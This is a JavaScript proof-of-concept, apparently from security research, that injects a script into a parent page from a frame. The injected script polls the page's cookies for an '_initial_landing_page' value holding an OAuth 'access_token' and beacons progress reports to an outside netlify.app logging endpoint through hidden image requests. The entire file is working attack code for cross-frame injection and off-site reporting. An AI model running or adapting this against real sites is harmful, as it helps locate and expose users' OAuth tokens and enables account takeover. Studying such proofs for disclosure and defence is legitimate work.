(() => {
  const pdoc = parent.document;

  const script = pdoc.createElement("script");
  script.textContent = String.raw`
    (() => {
      const ENDPOINT =
        "https://http-log-collector.netlify.app/api/log";

      function report(step, detail = "") {
        try {
          const url = new URL(ENDPOINT);
          url.searchParams.set("s", step);

          if (detail) {
            url.searchParams.set("d", String(detail).slice(0, 200));
          }

          // Image requests survive in more contexts than sendBeacon.
          const img = new Image();
          img.src = url.toString() + "&_=" + Date.now() +
                    Math.random().toString(36).slice(2);
        } catch {}
      }

      window.__oauthPocMonitor?.stop?.();

      let stopped = false;
      let attempts = 0;
      let timeoutId;

      function stop() {
        stopped = true;
        clearTimeout(timeoutId);
        report("monitor-stopped");
      }

      window.__oauthPocMonitor = { stop };

      function inspect() {
        if (stopped) return;

        attempts++;

        try {
          const cookies = document.cookie || "";

          const match = cookies.match(
            /(?:^|;\s*)_initial_landing_page=([^;]*)/
          );

          report(
            "tick",
            "n=" + attempts +
            ",state=" + document.readyState +
            ",visible=" + !document.hidden +
            ",cookie=" + !!match
          );

          if (match) {
            let value = match[1];

            try {
              value = decodeURIComponent(value);
            } catch {}

            const tokenPresent =
              /(?:^|[?#&])access_token=[^&#]+/.test(value);

            report(
              "landing-cookie-readable",
              "tokenPresent=" + tokenPresent
            );

            if (tokenPresent) {
              stopped = true;
              report("proof-complete", "token-readable=true");
              return;
            }
          }
        } catch (error) {
          report("inspect-error", error?.message || error);
        }

        if (attempts >= 60) {
          report("monitor-timeout");
          return;
        }

        timeoutId = setTimeout(inspect, 1000);
      }

      addEventListener("pageshow", () => report("parent-pageshow"));
      addEventListener("pagehide", () => report("parent-pagehide"));
      addEventListener(
        "visibilitychange",
        () => report("visibility", document.visibilityState)
      );

      report("parent-monitor-installed");
      inspect();
    })();
  `;

  (pdoc.head || pdoc.documentElement).appendChild(script);
  script.remove();
})();
